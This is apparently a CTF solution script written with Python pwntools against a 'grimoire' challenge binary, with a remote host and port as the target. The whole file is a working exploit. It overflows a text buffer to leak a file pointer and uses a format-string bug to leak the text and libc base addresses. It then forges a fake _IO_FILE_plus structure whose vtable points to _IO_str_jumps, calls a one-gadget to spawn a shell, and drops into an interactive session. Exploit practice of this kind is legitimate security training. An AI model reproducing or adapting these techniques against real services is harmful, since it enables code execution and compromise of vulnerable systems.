#!/usr/bin/env python
#encoding: utf-8;

from pwn import *
import sys

FILENAME = "./chall"

rhp1 = {"host":"13.231.207.73","port":9008}
rhp2 = {'host':"localhost",'port':12300}
context(os='linux',arch='amd64')
binf = ELF(FILENAME)

def hoge(conn,ix):
  conn.recvuntil("> ")
  conn.sendline(str(ix))

def _open(conn):
  hoge(conn,1)

def _read(conn):
  hoge(conn,2)
  conn.recvuntil("--*\n")
  return conn.recvuntil("*")[:-1]

def _revise(conn,off,text):
  hoge(conn,3)
  conn.recvuntil("Offset: ")
  conn.sendline(str(off))
  conn.recvuntil("Text: ")
  conn.send(text)
  
def _close(conn):
  hoge(conn,4)  

original_len = 370
margin = 0x90-2 #オリジナルのtextの末尾とfpとのオフセット
off_dlmap = 0x400031
off_grimoire_open = 0x1045
off_libc_scu_init = 0xab63d08690
off_libc_start_main231 = 0x21b97
off_main = 0x1478

ogs = [0x4f2c5,0x4f322,0x10a38c]

def exploit(conn):
  #leak libcbase and textbase
  _open(conn)
  _read(conn)
  _revise(conn,370,"A"*margin)
  fp =  unpack(_read(conn).split("A"*margin)[1].ljust(8,'\x00'))
  print("[*]fp: "+hex(fp))
    ##make it possible to fopen with init==1 by forcing fp=0
  _revise(conn,370,"A"*margin + p64(0) + "B"*0x18 + "%13$p:%14$p:%22$p\x00")

  _open(conn) #invoke error and do FSA
  data = conn.recvline().split(": No such")[0]
  textbase = int(data.split(":")[1],16) - off_grimoire_open
  libcbase = int(data.split(":")[2],16) - off_libc_start_main231
  addr_text = textbase + 0x202060
  print("[!]libcbase: "+hex(libcbase))
  print("[!]textbase: "+hex(textbase))
  print("[*]addr text: "+hex(addr_text))


  #forged fake _IO_FILE_plus
  magic = 0x40
  hoge = p64(0x0) #should be
  hoge += p64(0x000055ce789cf603)
  hoge += p64(0x000055ce789cf603)
  hoge += p64(0x0)
  hoge += p64(0x0)
  hoge += p64(libcbase + ogs[0]) #rdi
  hoge += p64(libcbase + ogs[0]) #rsi
  hoge += p64(0x0) #_IO_buf_base
  hoge += p64(0x700) #_IO_buf_end
  hoge += p64(0)*4
  hoge += p64(libcbase + 0x3ec680) #chain
  hoge += p64(0x0000000000000005)
  hoge += p64(0)*2
  hoge += p64(libcbase + 0x3ed8b0)
  hoge += p64(0x0000000000000173)
  hoge += p64(0)
  hoge += p64(libcbase + 0x3ed8b0) #lock
  hoge += p64(0)*6
  hoge += p64(libcbase + 0x3e8340 + 0x28) #_IO_str_jumps with little zure
  
  hoge += p64(libcbase + 0x00022e91) #_s._allocate_buffer == call rsi gadget
  hoge += "A"*(0x200 - magic -len(hoge)) + p64(addr_text + magic) + p64(0)*3 + "grimoire.txt"
  _revise(conn,magic,hoge)
  raw_input()

  _close(conn)

if len(sys.argv)>1:
  if sys.argv[1][0]=="d":
    cmd = """
      set follow-fork-mode parent
    """
    conn = gdb.debug(FILENAME,cmd)
  elif sys.argv[1][0]=="r":
    conn = remote(rhp1["host"],rhp1["port"])
else:
    conn = remote(rhp2['host'],rhp2['port'])
exploit(conn)
conn.interactive()

